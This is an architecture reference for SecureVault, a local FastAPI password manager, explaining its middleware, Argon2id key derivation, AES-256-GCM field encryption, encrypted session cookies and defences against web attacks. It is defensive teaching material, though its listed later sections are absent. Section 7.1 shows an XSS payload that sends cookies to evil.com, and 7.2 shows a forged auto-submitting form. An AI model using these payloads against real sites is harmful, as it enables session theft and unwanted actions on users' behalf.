# SecureVault — Architecture Reference

This document is the definitive engineering reference for SecureVault. It explains not just _what_ each component does but _why_ it is designed that way, what attacks it defends against, and how every piece of cryptography works — written so that you can come back to this after months away and fully reconstruct your mental model of the app.

No prior security knowledge is assumed. Technical terms are explained the first time they appear.

---

## Table of Contents

1. [System Overview](#1-system-overview)
2. [Component Diagram](#2-component-diagram)
3. [Request Lifecycle](#3-request-lifecycle)
4. [Middleware Stack](#4-middleware-stack)
5. [Your Master Password — End-to-End Journey](#5-your-master-password--end-to-end-journey)
6. [Cryptography Design](#6-cryptography-design)
7. [Attack Prevention — What We Defend Against and How](#7-attack-prevention--what-we-defend-against-and-how)
8. [Security Headers Explained](#8-security-headers-explained)
9. [Two-Factor Authentication State Machine](#9-two-factor-authentication-state-machine)
10. [Database Schema](#10-database-schema)
11. [Module Map](#11-module-map)
12. [Security Decisions and Rationale](#12-security-decisions-and-rationale)
13. [Key Invariants — Never Violate](#13-key-invariants--never-violate)

---

## 1. System Overview

SecureVault is a **local-first, single-user encrypted credential manager** that runs as a FastAPI web application on your local machine or a private server. All vault data lives in a single SQLite database file (`securevault.db`).

### The core promise

Your master password is **never stored anywhere** — not in the database, not in memory after your session ends, not in any log file. When you type it, the app uses it to derive an encryption key, then immediately discards the password. The key is used to decrypt your vault for the duration of your session, then discarded on logout.

All sensitive vault data (usernames, passwords, notes) is encrypted at the field level using AES-256-GCM (a modern authenticated encryption algorithm) before being written to disk. Anyone who steals the database file gets nothing but unreadable encrypted blobs.

### The known limitation

This is **encrypted at rest** — meaning the data on disk is protected. It is NOT **zero-knowledge** — meaning the server decrypts vault entries in memory before sending them to your browser as HTML. During an active session, a compromised server process could observe decrypted secrets. Eliminating this would require moving decryption into the browser using the Web Cryptography API (a browser-native crypto library) — out of scope for current phases.

---

## 2. Component Diagram

```
┌─────────────────────────────────────────────────────────────┐
│                         Browser                             │
│                  (Jinja2 HTML + Tailwind CSS)               │
└──────────────────────────┬──────────────────────────────────┘
                           │  HTTPS in production
                           │  (HTTP in local dev)
                           │  Carries an encrypted session cookie
                           ▼
┌─────────────────────────────────────────────────────────────┐
│                    FastAPI / Uvicorn                         │
│                                                             │
│  ┌────────────────── Middleware Stack ───────────────────┐  │
│  │  1. CSPMiddleware       (outermost — runs first)      │  │
│  │  2. EncryptedSessionMiddleware                        │  │
│  │  3. CSRFMiddleware                                    │  │
│  │  4. LoginRateLimitMiddleware                          │  │
│  │  5. AuthGuard           (innermost — runs last)       │  │
│  └───────────────────────────────────────────────────────┘  │
│                                                             │
│  ┌──── Routes ────┐   ┌──── Services ───────────────────┐  │
│  │ routes/auth.py │──▶│ auth_service.py                 │  │
│  │ routes/vault.py│──▶│ vault_service.py                │  │
│  └────────────────┘   │ import_export.py                │  │
│                       └────────────┬────────────────────┘  │
│                                    │                        │
│  ┌──── Security ──────────────────▼────────────────────┐   │
│  │ encryption.py  (AES-256-GCM, Fernet, Argon2id KDF)  │   │
│  │ hashing.py     (Argon2id password hash / verify)     │   │
│  │ totp.py        (TOTP generate / verify / recovery)   │   │
│  │ audit.py       (structured JSON audit log)           │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                             │
│  ┌──── Database ───────────────────────────────────────┐   │
│  │ SQLAlchemy ORM ──▶ SQLite (securevault.db)           │   │
│  │ WAL mode enabled; Alembic handles migrations         │   │
│  └─────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│                     Log Files (logs/)                        │
│  app.log   — operational debug log (all modules, rotating)   │
│  audit.log — structured JSON security events (rotating)      │
└─────────────────────────────────────────────────────────────┘
```

---

## 3. Request Lifecycle

This is the step-by-step journey of a typical authenticated request — `GET /vault` (the dashboard). Every layer is explained, including what it does and why it exists.

```
Browser
  │
  │  GET /vault
  │  Cookie: sv_session=<encrypted blob>
  ▼
══════════════════════════════════════════════════════════════
 Layer 1: CSPMiddleware  (outermost — runs first on every request)
  • Does NOT inspect the request at all.
  • On the outgoing response it stamps four security headers:
      Content-Security-Policy, X-Frame-Options,
      X-Content-Type-Options, Strict-Transport-Security
  • These headers tell the browser how to behave when rendering
    the page. Explained in detail in Section 8.
  • Why outermost: these headers must appear on ALL responses,
    including error pages produced by inner layers. If CSP were
    innermost, a CSRF 403 response would lack the headers.
══════════════════════════════════════════════════════════════
 Layer 2: EncryptedSessionMiddleware
  • Reads the sv_session cookie from the request headers.
  • Decrypts the Fernet blob using a key derived from SECRET_KEY.
    (Fernet = a symmetric encryption scheme; decryption fails if
     the data has been tampered with or the TTL has expired.)
  • Populates request.session = {
        "encryption_key": "<base64 vault key>",
        "user_id": 1,
        "csrf_token": "<random token>"
    }
  • If the cookie is absent, expired, or tampered:
    session is set to an empty dict {}.
  • Why outermost relative to CSRF and AuthGuard:
    both of those need to read session data — they can only do
    so AFTER this layer has decrypted it.
══════════════════════════════════════════════════════════════
 Layer 3: CSRFMiddleware
  • What is CSRF? See Section 7.2 for a full explanation.
  • GET requests:
      - If session["csrf_token"] is absent, generates a new
        random token (secrets.token_urlsafe(32)) and stores it.
      - Makes the token available via request.state.csrf_token
        so the Jinja2 template can embed it in a hidden form field.
  • POST/PUT/DELETE requests (state-changing operations):
      - Reads the csrf_token field from the submitted form data.
      - Compares it against session["csrf_token"].
      - Mismatch → 403 Forbidden. The form was not submitted from
        our own page, so we reject it.
══════════════════════════════════════════════════════════════
 Layer 4: LoginRateLimitMiddleware
  • Only intercepts POST /login.
  • Checks a per-IP failed-attempt counter stored in an
    in-memory Python dict (resets on server restart).
  • If the IP is locked out → 429 Too Many Requests
    with a Retry-After header telling the client when to retry.
  • On a successful login (303 redirect) → counter resets.
  • On a failed login (401 Unauthorized) → counter increments.
  • Why inside CSRF: bots without a valid CSRF token get a 403
    from Layer 3 before reaching here — those fake requests never
    inflate the per-IP counter.
══════════════════════════════════════════════════════════════
 Layer 5: AuthGuard  (innermost — runs last before route handler)
  • Checks request.session.get("encryption_key").
  • If the key is absent and the path is not on the exempt list:
    → 302 redirect to /login. No route handler is invoked.
  • Exempt paths (don't need a session):
      /login, /setup, /2fa/verify, /2fa/recovery,
      /auth/timeout-notify, /static/*
  • If the key IS present:
    → Sets Cache-Control: no-store on the response so the browser
      never caches pages that contain decrypted vault data.
══════════════════════════════════════════════════════════════
 Route Handler: vault.get_vault()
  • Decodes the base64 encryption key from the session → raw bytes.
  • Reads user_id from the session.
  • Calls vault_service.get_entries(user_id, raw_key, db).
══════════════════════════════════════════════════════════════
 Service Layer: vault_service.get_entries()
  • Runs: SELECT * FROM vault_entries WHERE user_id = ?
    (parameterised query — the ORM never interpolates values
     directly into SQL strings, blocking SQL injection attacks).
  • For each row:
      - Reads entry.encryption_version ("fernet" or "aesgcm").
      - Calls get_cipher(version, raw_key) to get the right
        decrypt function for that row's algorithm.
      - Decrypts username_encrypted, password_encrypted,
        notes_encrypted → plaintext strings in memory.
      - If version is "fernet" (legacy Phase 1): silently
        re-encrypts all three fields with AES-256-GCM and saves
        the row. This upgrade happens once per row, never again.
  • Returns list[VaultEntryResponse] — Pydantic objects with
    plaintext fields. Plaintext only exists in server memory.
══════════════════════════════════════════════════════════════
 Template Rendering
  • Jinja2 renders vault.html with the decrypted entry list.
  • Jinja2 auto-escapes all template variables by default:
    {{ entry.title }} becomes HTML entities, so even if a title
    contained <script>alert(1)</script> it would be rendered
    as visible text, not executed as JavaScript.
  • The rendered HTML is sent to the browser.
  • Decrypted values go out of scope and are garbage-collected.
══════════════════════════════════════════════════════════════
 Response Path (outward — each middleware layer processes
 the response on the way back out)
  • AuthGuard: adds Cache-Control: no-store header.
  • CSRFMiddleware: no action on GET responses.
  • EncryptedSessionMiddleware: re-encrypts the session dict
    (with any updates made during the request) back into the
    sv_session cookie and sets it on the response.
  • CSPMiddleware: stamps the four security headers.
══════════════════════════════════════════════════════════════
Browser receives the HTML page + security headers.
```

---

## 4. Middleware Stack

### Why the add-order is reversed

FastAPI/Starlette applies `add_middleware()` in **reverse order** — the last call added becomes the outermost layer (the one that runs first on incoming requests). This is a Starlette convention and is counterintuitive.

```
Code order in main.py                 Actual execution order
─────────────────────────────         ──────────────────────────────────
app.add_middleware(AuthGuard)      →  1. CSPMiddleware     ← runs FIRST
app.add_middleware(RateLimit)      →  2. EncryptedSession
app.add_middleware(CSRF)           →  3. CSRFMiddleware
app.add_middleware(EncSession)     →  4. RateLimit
app.add_middleware(CSP)            →  5. AuthGuard         ← runs LAST
                  ↑
           added LAST = outermost
```

### Why each layer is in its specific position

```
┌────────────────────────────────────────────────────────────────────┐
│ 1. CSPMiddleware (outermost)                                        │
│                                                                     │
│    Stamps security headers on EVERY response, including error       │
│    pages produced by inner layers (403 CSRF errors, 429 lockout     │
│    pages, 500 server errors). If it were innermost, those error     │
│    pages would go out without security headers.                     │
│    Needs no session data → position is flexible, outermost is fine. │
├────────────────────────────────────────────────────────────────────┤
│ 2. EncryptedSessionMiddleware                                       │
│                                                                     │
│    Must run BEFORE layers 3–5, because all of them read session     │
│    data. Without decrypting the session cookie first, the CSRF      │
│    token, rate-limit state, and encryption key would be invisible.  │
├────────────────────────────────────────────────────────────────────┤
│ 3. CSRFMiddleware                                                   │
│                                                                     │
│    Must run AFTER session (needs session["csrf_token"]).            │
│    Must run BEFORE RateLimit — automated bots flooding /login       │
│    without a valid CSRF token get a 403 here. Those requests        │
│    never reach the rate limiter, so they can't exhaust it and       │
│    lock out real users (a denial-of-service on the lockout counter).│
├────────────────────────────────────────────────────────────────────┤
│ 4. LoginRateLimitMiddleware                                         │
│                                                                     │
│    Only intercepts POST /login. By sitting inside CSRF, only        │
│    legitimate (CSRF-validated) login attempts ever count toward     │
│    the per-IP failure counter.                                      │
├────────────────────────────────────────────────────────────────────┤
│ 5. AuthGuard (innermost)                                            │
│                                                                     │
│    The final gatekeeper. By the time a request reaches here,        │
│    the session is already decrypted (Layer 2), CSRF is validated    │
│    (Layer 3), and rate limits are checked (Layer 4). AuthGuard      │
│    simply asks: "does this session have a valid encryption key?"    │
│    If not → redirect to /login. If yes → let the route run.        │
└────────────────────────────────────────────────────────────────────┘
```

---

## 5. Your Master Password — End-to-End Journey

This section traces exactly what happens to your master password from the moment you type it to the moment it is gone from memory. This is the most important section for understanding the security model.

### 5.1 — First-time setup (`/setup`)

When you create your vault for the first time:

```
You type a master password on the /setup form
  │
  ▼
POST /setup  →  FastAPI receives `password` as a form field string
  │
  ├─── Operation A: Hash the password for login verification
  │      PasswordHasher.hash(password)
  │           uses Argon2id algorithm
  │           generates its own internal random salt
  │           produces a PHC string (explained below)
  │      Result stored in → users.password_hash
  │
  ├─── Operation B: Generate a random KDF salt
  │      os.urandom(32)  →  32 random bytes  →  base64-encoded string
  │      Result stored in → users.kdf_salt
  │
  └─── The master password string goes out of scope
       Python's garbage collector eventually reclaims the memory
       The password is NEVER written to disk in any form
```

**What is a PHC string?**
PHC stands for Password Hashing Competition — the format Argon2 uses to store all parameters alongside the hash so future verification can use the exact same settings. It looks like this:

```
$argon2id$v=19$m=65536,t=3,p=4$<base64-salt>$<base64-hash>
    │       │    │       │   │
    │       │    │       │   └── 4 parallel threads used
    │       │    │       └────── 3 passes through memory
    │       │    └────────────── 65,536 KiB = 64 MiB of RAM required
    │       └─────────────────── Argon2 version 19
    └─────────────────────────── Argon2id algorithm

The <base64-salt> embedded here is different from users.kdf_salt.
This salt is for login verification only — it was generated randomly
inside PasswordHasher.hash() and lives embedded in this string.
```

**What is a KDF salt?**
KDF stands for Key Derivation Function. The `kdf_salt` is a separate 32-byte random value stored in its own column. Unlike the PHC salt (which is embedded in the hash and only used for verification), the KDF salt is used to derive the vault encryption key. It must be stored separately because the derivation needs to be **deterministic** — the same (password + salt) pair must always produce the same key, so you can unlock your vault on every login.

---

### 5.2 — Every subsequent login (`/login`)

```
You type your master password on the /login form
  │
  ▼
POST /login  →  FastAPI receives `password` as a form field string
  │
  │  Step 1: Verify the password
  │  ─────────────────────────────
  │  Fetch the one User row from the database.
  │  Run: PasswordHasher.verify(stored_hash, entered_password)
  │       This re-runs Argon2id with the SAME parameters and the salt
  │       embedded in the stored PHC string, then compares the result.
  │       → True  = password is correct
  │       → False = wrong password
  │
  │  IMPORTANT: if no User row exists (vault not set up), the code
  │  still runs Argon2id against a fake dummy hash. This costs the
  │  same ~200ms as a real verification, so an attacker cannot tell
  │  whether a vault exists based on response time.
  │
  │  Step 2: Derive the vault encryption key
  │  ─────────────────────────────────────────
  │  (only reached if Step 1 succeeded)
  │
  │  derive_key(master_password, users.kdf_salt)
  │       Runs Argon2id via hash_secret_raw() — the low-level API
  │       that returns raw bytes instead of a PHC string.
  │       Uses the STORED kdf_salt (same every login → same key).
  │       Parameters: time_cost=3, memory_cost=64MiB, parallelism=4
  │       Output: 32 raw bytes (256 bits) — the vault encryption key
  │
  │  The same (password + kdf_salt) pair always produces the same key.
  │  This is what allows the vault to be decrypted on every login
  │  without storing the key anywhere.
  │
  │  Step 3: Store the key in the session (never on disk)
  │  ──────────────────────────────────────────────────────
  │  The 32 raw bytes are base64-encoded (to make them a plain string).
  │  session["encryption_key"] = base64_encoded_key
  │  session["user_id"] = user.id
  │
  │  The session dict is then Fernet-encrypted into the sv_session
  │  cookie. So the key is on disk in encrypted form only — no one
  │  can read it without knowing SECRET_KEY.
  │
  └─── The master password string goes out of scope and is gone.
       It is NEVER logged, NEVER written to disk, NEVER stored.
```

### 5.3 — During the session

On every authenticated request:
1. The `sv_session` cookie is decrypted → `session["encryption_key"]` is a base64 string in memory.
2. The route handler decodes it to raw bytes: `raw_key = base64.urlsafe_b64decode(key_b64)`.
3. `raw_key` is passed to `vault_service` which uses it to decrypt field-level ciphertext.
4. `raw_key` goes out of scope when the request finishes — the next request starts Step 1 again.

### 5.4 — On logout

```python
session.clear()   # Removes encryption_key, user_id, csrf_token — everything.
```

The encrypted session cookie is then overwritten with an empty encrypted session. The vault key is gone from memory. There is no way to decrypt vault entries until the user logs in again.

### 5.5 — What an attacker would need to do

To decrypt vault entries from the database file alone, an attacker would need to:
1. Know your master password (to run Argon2id KDF with the stored `kdf_salt`), AND
2. Know the `kdf_salt` (in the database).

Since the KDF is Argon2id with 64 MiB RAM cost, brute-forcing even a moderately strong password is computationally impractical with current hardware.

---

## 6. Cryptography Design

There are **four separate cryptographic operations** in SecureVault. Never conflate them.

```
Operation                  Algorithm          Purpose
────────────────────────── ────────────────── ──────────────────────────────
Password hashing           Argon2id           Verify the password at login
Vault key derivation       Argon2id (KDF)     Produce the 32-byte encryption key
Vault field encryption     AES-256-GCM        Encrypt usernames / passwords / notes
Session cookie encryption  Fernet + HKDF      Make the session cookie opaque
```

---

### 6.1 — Password Hashing (Argon2id via PasswordHasher)

**Purpose:** Store a one-way fingerprint of the master password so we can verify it at login without ever storing the password itself.

**One-way means:** given the stored hash, there is no algorithm to reverse it back to the password. The only way to "crack" it is to try every possible password until one matches — which is what Argon2id makes expensive.

**Why Argon2id instead of older algorithms (bcrypt, PBKDF2):**

| Algorithm | Attack resistance |
|---|---|
| MD5, SHA-1 | None — billions of guesses per second on a laptop GPU |
| PBKDF2 | CPU-bound only — GPU farms can still run millions/second |
| bcrypt | Better, but still CPU-bound |
| **Argon2id** | **Memory-hard** — requires 64 MiB RAM per guess, GPU farms cannot parallelize cheaply |

Memory-hard means: to guess 1 million passwords in parallel, an attacker needs 1 million × 64 MiB = 64 TB of RAM. That is economically impractical with current hardware. This is why OWASP (the web application security standard body) recommends Argon2id as the first choice.

**Library:** `argon2-cffi` — specifically the `PasswordHasher` class for this operation.

**Code flow:**
```
hash_password(plaintext)  →  PasswordHasher.hash(plaintext)
                              returns PHC string stored in users.password_hash

verify_password(entered, stored_hash)  →  PasswordHasher.verify(stored_hash, entered)
                                           returns True/False
                                           raises VerifyMismatchError if wrong
```

---

### 6.2 — Vault Key Derivation (Argon2id via hash_secret_raw)

**Purpose:** Produce a deterministic 32-byte encryption key from the master password and a stored random salt.

**Deterministic means:** given the same inputs (password + salt), the output is always identical. This is what allows you to unlock your vault on every login without ever storing the key.

**Why a different API than password hashing:**

`PasswordHasher.hash()` is designed to be different every call — it generates a new random salt internally, so the same password produces a different PHC string each time. That's correct for password storage (prevents two users with the same password from having the same hash).

`hash_secret_raw()` is the low-level KDF API — it takes a specific salt as input and returns raw bytes, not a PHC string. Using the same stored `kdf_salt` on every login guarantees the same output key.

**Parameters:** (same as hashing — equally expensive for an attacker)
- `time_cost=3` — 3 passes through memory
- `memory_cost=65536` KiB = 64 MiB RAM required
- `parallelism=4` — 4 CPU threads used
- `hash_len=32` — output is exactly 32 bytes (256 bits)
- `type=Type.ID` — Argon2**id** variant (combines GPU-resistance and side-channel resistance)

**The `kdf_salt`:**
- Generated once at vault setup: `os.urandom(32)` → 32 bytes from the OS's CSPRNG
- CSPRNG = Cryptographically Secure Pseudo-Random Number Generator. On Linux/macOS this is `/dev/urandom`, backed by the kernel entropy pool. It is safe for cryptographic use.
- Stored as base64 in `users.kdf_salt` — it never changes for the lifetime of the vault
- Has a UNIQUE database constraint: no two users can share a salt, preventing two users from deriving the same key from the same password

**Diagram:**
```
Master Password  +  users.kdf_salt (stored 32-byte random salt)
        │                    │
        └──────────┬─────────┘
                   │
                   ▼
         hash_secret_raw()   ← Argon2id, 64MiB RAM, 3 passes
                   │
                   ▼
         32 raw bytes (256 bits)  ← vault encryption key
                   │
                   ▼
         base64-encode  →  stored in session["encryption_key"]
                            as a plain string in the encrypted cookie
                            NEVER written to disk in raw form
                            CLEARED on logout
```

---

### 6.3 — Vault Field Encryption

Every sensitive field (username, password, notes) is encrypted individually before being written to the database. The plaintext never touches disk.

#### Why encrypt at the field level?

If an attacker steals `securevault.db`, they get a SQLite file with columns like:
```
title           | username_encrypted        | password_encrypted
─────────────── | ─────────────────────────── | ──────────────────────────────
GitHub          | AQIAAA...encrypted...==   | gAAAAAB...encrypted...==
Gmail           | Zm9vYm...encrypted...==   | X5yGCB...encrypted...==
```

The `title` is visible (it's plaintext — see Section 12 for why). The usernames and passwords are unreadable encrypted tokens. Without the vault key, they are useless.

#### Two algorithms — tracked per database row

There are two encryption algorithms in the codebase. Which one was used for each row is tracked by `encryption_version`:

**Algorithm 1: Fernet (legacy — Phase 1 only)**

Fernet is a symmetric encryption scheme from the Python `cryptography` library. It combines:
- AES-128-CBC for encryption (AES = Advanced Encryption Standard, a block cipher; CBC = Cipher Block Chaining, a mode of operation)
- HMAC-SHA256 for authentication (HMAC = Hash-based Message Authentication Code; ensures the ciphertext hasn't been tampered with; SHA-256 = Secure Hash Algorithm, the underlying hash function)
- A timestamp embedded in the token

Fernet is no longer used for new entries. It exists only to read Phase 1 legacy rows during the lazy upgrade.

**Algorithm 2: AES-256-GCM (current standard — Phase 2+)**

GCM = Galois/Counter Mode. It is an **authenticated encryption** algorithm, meaning it provides both:
- **Confidentiality**: the ciphertext reveals nothing about the plaintext
- **Integrity/authenticity**: any modification to the ciphertext is detected at decrypt time

Why GCM is better than Fernet for this use case:
- AES-**256** (256-bit key) vs Fernet's AES-**128** (128-bit key) — stronger against future cryptanalytic advances
- Single-pass: encryption and authentication happen simultaneously, more efficient
- No timestamp embedded — simpler format, easier to reason about

**AES-256-GCM storage format:**

Every encrypted token stored in the database is a base64-encoded concatenation of three parts:

```
What is stored in the DB column (e.g. password_encrypted):
  base64url( nonce ‖ ciphertext ‖ tag )
                │          │         │
             12 bytes    N bytes   16 bytes
                │          │         │
                │          │         └─ Authentication tag — a 16-byte
                │          │             fingerprint of the ciphertext.
                │          │             If even one bit of the ciphertext
                │          │             is changed, decryption will detect
                │          │             the tampering and fail.
                │          │
                │          └─ Ciphertext — same number of bytes as the
                │              plaintext. The actual encrypted content.
                │
                └─ Nonce — "Number used ONCE". A 12-byte random value
                    generated fresh for every single encryption call.
                    Critical: if the same (key + nonce) pair is ever
                    reused, GCM's security breaks catastrophically —
                    it leaks the authentication key and allows plaintext
                    recovery. Using os.urandom(12) per call makes
                    accidental reuse astronomically unlikely.
```

**Decryption:**
```
base64url decode the stored token
  → first 12 bytes = nonce
  → remaining bytes = ciphertext + tag

AESGCM.decrypt(nonce, ciphertext+tag, aad=None)
  → plaintext if authentication tag is valid
  → InvalidToken exception if tampered or wrong key
```

`aad=None` — AAD stands for Additional Authenticated Data. It is optional data that is authenticated (bound into the tag) but not encrypted. We don't use it here because we have no per-record metadata that needs to be tied to the ciphertext.

#### Algorithm routing via `get_cipher()`

`vault_service` never imports `encrypt_field_gcm` directly. It calls:

```python
encrypt_fn, decrypt_fn = get_cipher(entry.encryption_version, raw_key)
plaintext = decrypt_fn(entry.password_encrypted)
```

`get_cipher()` is the single routing point that maps `"fernet"` or `"aesgcm"` to the correct functions, with the key already bound into closures. Adding a third algorithm in the future only requires changing this one function.

#### Lazy re-encryption (Fernet → AES-256-GCM upgrade)

When `_decrypt_entry()` reads a row with `encryption_version="fernet"`:

```
Step 1: Decrypt all three fields (username, password, notes) with Fernet.
Step 2: Re-encrypt all three fields with AES-256-GCM using the SAME key.
Step 3: Update encryption_version to "aesgcm" in the same DB transaction.
Step 4: db.commit() — atomic. Either all three fields upgrade, or none.
Step 5: Return the plaintext as normal. The caller sees no difference.

After this, the row is permanently on AES-256-GCM. This code path
never runs for that row again.
```

**Why lazy (not a one-time batch migration)?**
Alembic (the database migration tool) runs at server startup, before any user has logged in. The vault encryption key exists only in the session — which only exists after login. There is no way for a migration script to access the key. Lazy re-encryption waits until the user is logged in and the key is safely in memory.

---

### 6.4 — Session Cookie Encryption

#### Why does the session cookie need to be encrypted?

A session cookie stores data about your logged-in state between requests. The browser sends it with every request and the server reads it back.

**Without encryption (Starlette's default `SessionMiddleware`):**
The session data is base64-encoded and HMAC-signed. Signing means: the server can detect if the data was tampered with. But the payload is still **readable** — base64 is not encryption, it's encoding. Anyone who intercepts or copies the cookie value can decode it and see `{"encryption_key": "...", "user_id": 1}`.

Since our session stores the vault encryption key, a readable session cookie means the key is exposed to:
- Network eavesdroppers (if not on HTTPS)
- The browser itself (JavaScript can read cookies unless `HttpOnly` is set)
- Anyone who can view your browser's stored cookies

**With Fernet encryption (`EncryptedSessionMiddleware`):**
The session data is JSON-serialised, then Fernet-encrypted using a key derived from `SECRET_KEY`. The cookie value looks like random noise — the vault key inside is completely opaque. Even someone who holds the cookie value learns nothing without also knowing `SECRET_KEY`.

#### How the session cookie key is derived

The session is not encrypted with `SECRET_KEY` directly. Instead, `SECRET_KEY` is passed through **HKDF** to derive a dedicated Fernet key:

```
SECRET_KEY (the value from your .env file)
      │
      ▼
HKDF-SHA256  (HKDF = HMAC-based Key Derivation Function)
  │
  └─ Takes an input key material (SECRET_KEY) and produces a
     new derived key of a specific length.
  │
  └─ Why not use SECRET_KEY directly as the Fernet key?
     - Fernet requires a key of exactly 32 bytes encoded as URL-safe base64.
     - SECRET_KEY may be any length.
     - HKDF normalises the length and also provides "key separation" —
       the derived key is cryptographically independent of SECRET_KEY,
       so using SECRET_KEY for something else doesn't weaken the session.
      │
      ▼
32-byte derived key → base64-encoded → Fernet session key
```

#### Cookie lifecycle

```
At login (session write):
  session dict  →  JSON string  →  Fernet.encrypt()  →  sv_session cookie value
                                        ↑
                               key derived from SECRET_KEY via HKDF

At every subsequent request (session read):
  sv_session cookie value  →  Fernet.decrypt()  →  JSON string  →  session dict
                                   │
                                   └─ If the cookie has been:
                                        - Tampered with → InvalidToken → session = {}
                                        - Expired (TTL) → InvalidToken → session = {}
                                        - Absent → session = {}

At logout:
  session.clear()  →  session dict = {}
  EncryptedSessionMiddleware re-encrypts the empty dict → empty cookie
  The vault key is gone from the session and cannot be recovered.
```

#### Cookie security attributes

| Attribute | Value | Why it matters |
|---|---|---|
| `HttpOnly` | `True` | JavaScript in the browser cannot read this cookie. Blocks XSS attacks from stealing the session cookie. |
| `SameSite=strict` | `strict` | The browser will not send this cookie on any cross-site request — not even a top-level navigation from another site. The strongest CSRF defence at the cookie level. |
| `Secure` | `True` (production) | The browser only sends this cookie over HTTPS connections. Prevents interception on unencrypted networks. |
| `Max-Age` | `SESSION_TIMEOUT_MINUTES × 60` | The Fernet TTL enforces server-side expiry — even if someone copies the cookie, it becomes invalid after this period. |

---

### 6.5 — CSRF Token Generation

CSRF (Cross-Site Request Forgery — explained fully in Section 7.2) is prevented by a synchronizer token. Here is how the token is generated and used:

**Generation (on GET requests):**
```python
token = secrets.token_urlsafe(32)
# secrets.token_urlsafe(32) generates 32 bytes from the OS CSPRNG
# and encodes them as URL-safe base64 → a 43-character string.
# e.g. "H9xgK3mPqRt7LsNvCbYwAzEfJdUiOkXl2TnVhMq"

session["csrf_token"] = token
# Stored in the encrypted session cookie — not in the database.
```

**Embedding in HTML (Jinja2 template):**
```html
<form method="POST" action="/entry/new">
  <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
  <!-- other form fields -->
</form>
```

**Validation (on POST/PUT/DELETE):**
```python
form_token = await request.form()["csrf_token"]    # from the submitted form
session_token = request.session["csrf_token"]      # from the encrypted cookie

if form_token != session_token:
    raise HTTPException(status_code=403)
```

A cross-site attacker cannot embed the correct token because:
1. The token is stored in the encrypted session cookie (unreadable without SECRET_KEY).
2. The token is embedded in the HTML page (unreadable from another origin due to the browser's Same-Origin Policy — a browser security model that prevents JavaScript on `evil.com` from reading pages or responses from `securevault.local`).

---

## 7. Attack Prevention — What We Defend Against and How

This section explains each attack category, shows a concrete example of how it would work, and explains exactly which code or configuration blocks it.

---

### 7.1 — Cross-Site Scripting (XSS)

**What is XSS?**
An attacker injects malicious JavaScript into a page that other users then view. When the victim's browser loads the page, the injected script runs — it can steal cookies, read page content, make requests on behalf of the user, or redirect them.

**Example attack:**
Imagine an attacker saves a vault entry with this as the title:
```
<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>
```
If the app renders this title directly in HTML, the victim's browser executes the script and the session cookie is sent to `evil.com`.

**How we block it:**

**Layer 1 — Jinja2 auto-escaping (template layer):**
Jinja2 escapes all template variables by default. `{{ entry.title }}` renders as:
```html
&lt;script&gt;fetch(...)&lt;/script&gt;
```
The browser displays this as literal text on screen. It is never interpreted as code.

**Layer 2 — Content Security Policy (CSP header):**
Even if somehow a `<script>` tag made it into the page, CSP tells the browser:
- Only execute scripts from our own origin (`script-src 'self'`)
- Never execute inline scripts (`<script>alert(1)</script>` is blocked)
- Never load content from external domains

If an attacker injects a script, CSP prevents the browser from running it. This is a defence-in-depth layer on top of auto-escaping.

**Layer 3 — HttpOnly cookie:**
Even if an XSS attack somehow succeeded, `HttpOnly` on the session cookie means `document.cookie` returns an empty string — the session cookie is invisible to JavaScript. The attacker cannot steal the session cookie via XSS.

---

### 7.2 — Cross-Site Request Forgery (CSRF)

**What is CSRF?**
An attacker tricks your browser into submitting a form request to our app on your behalf, using your existing session cookie. The key insight: browsers automatically attach cookies to every request to the matching domain — even requests triggered from another website.

**Example attack without CSRF protection:**
1. You are logged into SecureVault at `http://localhost:8000`.
2. You visit `http://evil.com`, which has this hidden HTML:
   ```html
   <form action="http://localhost:8000/entry/123/delete" method="POST">
   </form>
   <script>document.forms[0].submit()</script>
   ```
3. Your browser submits the form to SecureVault with your session cookie attached.
4. SecureVault deletes entry 123, thinking the request came from you.

**How we block it — Synchronizer Token Pattern:**

Our CSRF token is a random secret that is:
- Generated server-side and stored in the **encrypted session cookie**
- Embedded as a hidden field in every HTML form on the page
- Validated on every POST/PUT/DELETE before any action is taken

```
When you load a form page (GET /entry/123/delete):
  Server generates: csrf_token = "H9xgK3mP..."
  Stored in: encrypted session cookie (unreadable to attackers)
  Embedded in: <input type="hidden" name="csrf_token" value="H9xgK3mP...">

When you submit the form (POST):
  Browser sends: form data including csrf_token="H9xgK3mP..."
  Browser sends: sv_session cookie (automatically, same-origin)
  Server checks: form token == session token? ✓ → allow

When evil.com submits the form:
  Browser sends: form data with NO csrf_token (evil.com doesn't know it)
  Browser sends: sv_session cookie (automatically — this is the attack vector)
  Server checks: form token == session token? ✗ → 403 Forbidden
```

The attacker cannot include the correct CSRF token because:
1. The token lives in the encrypted session cookie → unreadable
2. The token is embedded in our HTML → same-origin policy prevents `evil.com` from reading pages from `localhost:8000`

**Second layer of CSRF defence — `SameSite=strict`:**
The `sv_session` cookie has `SameSite=strict`, which tells the browser: "Do not send this cookie on any cross-site request." With this attribute, the attack above fails even earlier — the session cookie is never sent with the cross-origin request, so the attacker can't even carry the session.

---

### 7.3 — Clickjacking

**What is clickjacking?**
An attacker loads your app in an invisible `<iframe>` overlaid on top of their own page. The user thinks they're clicking buttons on the attacker's page but they're actually clicking on your app behind it — potentially confirming actions like deleting entries or changing settings.

**How we block it — `X-Frame-Options: DENY`:**
This HTTP response header tells the browser: "Refuse to render this page inside any `<iframe>`, `<frame>`, or `<object>`." The browser enforces this — the attacker's page simply cannot embed SecureVault.

---

### 7.4 — MIME-Type Sniffing

**What is it?**
Browsers try to "sniff" the content type of a response when the server doesn't specify it clearly. An attacker can upload a file disguised as an image but actually containing JavaScript, and some browsers might try to execute it.

**How we block it — `X-Content-Type-Options: nosniff`:**
This header tells the browser: "Trust the `Content-Type` header I send, and never guess. If I say it's an image, treat it as an image — do not execute it as script."

---

### 7.5 — Protocol Downgrade / Unencrypted Traffic

**What is the risk?**
An attacker on your network (e.g., public Wi-Fi) could intercept HTTP traffic and read your session cookie or vault content. Even with HTTPS, some browsers might follow `http://` links to your app by mistake.

**How we block it — HSTS (HTTP Strict Transport Security):**
HSTS is a response header:
```
Strict-Transport-Security: max-age=31536000; includeSubDomains
```
This tells the browser: "For the next year, only connect to this domain via HTTPS. If you ever get an `http://` link, silently upgrade it to `https://` before sending the request. Never fall back to plain HTTP."

After the browser sees this header once, it enforces HTTPS-only for the domain for one year — even if the user types `http://` manually.
